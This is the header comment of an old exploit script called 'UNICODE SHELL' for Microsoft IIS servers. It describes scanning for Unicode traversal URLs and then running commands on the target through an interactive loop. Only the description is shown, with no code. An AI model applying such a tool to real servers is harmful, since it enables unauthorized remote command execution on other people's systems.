# UNICODE SHELL - by B-r00t.
# A Unicode HTTP exploit for Micro$oft NT IIS WebServers.
#
# First tries to get IIS Server string. 
# Scans for usable Unicode URL in 14 different ways.
# Then allows choice of which URL to use including an URL of
# your own design eg. After copying cmd.exe to /scripts.
# Commands are executed via your choice of URL on the target
# server.
# 
# URL can be changed at anytime by typing URL. 
# The Webserver can be re-SCANed at anytime by typing SCAN.
# Program can be QUIT at anytime by typing QUIT.
# HELP prints this ...
# ENJOY !
